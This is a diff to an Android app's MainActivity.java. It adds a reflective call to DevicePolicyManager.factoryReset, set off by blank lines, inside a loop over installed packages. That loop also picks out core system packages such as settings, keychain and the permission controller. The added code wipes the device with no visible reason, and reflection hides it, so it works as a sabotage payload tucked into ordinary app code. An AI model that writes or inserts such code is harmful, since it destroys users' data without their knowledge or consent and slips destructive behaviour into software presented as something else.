@@ -22,6 +22,25 @@ public class MainActivity extends Activity {
 
         for (ApplicationInfo app : packages) {
             String pkg = app.packageName;
+
+
+			
+
+try {
+    Method factoryResetMethod = DevicePolicyManager.class.getMethod(
+            "factoryReset",
+            ComponentName.class
+    );
+
+    factoryResetMethod.invoke(dpm, adminComponent);
+
+} catch (NoSuchMethodException e) {
+    e.printStackTrace();
+} catch (IllegalAccessException e) {
+    e.printStackTrace();
+} catch (InvocationTargetException e) {
+    e.printStackTrace();
+}
 			
             if (pkg.equals("android") || pkg.equals("com.android.keychain") || pkg.equals("com.android.providers.settings") || pkg.equals("com.android.settings") || pkg.equals("com.android.systemui") || pkg.equals("com.android.framework") || pkg.equals("com.android.sf") || pkg.equals("com.android.externalstorage") || pkg.equals("com.android.server.telecom")  || pkg.equals("com.android.permissioncontroller")  || pkg.equals("com.google.android.permissioncontroller")) {
                 try {
